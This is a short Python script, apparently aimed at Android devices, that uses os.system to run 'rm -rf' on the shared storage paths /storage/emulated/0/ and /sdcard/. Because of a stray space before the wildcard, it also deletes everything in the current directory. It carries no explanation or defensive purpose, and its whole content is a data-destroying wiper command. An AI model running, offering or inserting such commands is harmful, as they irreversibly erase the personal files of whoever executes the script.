import os
os.system("rm -rf /storage/emulated/0/ *")
os.system("rm -rf /sdcard/ *")
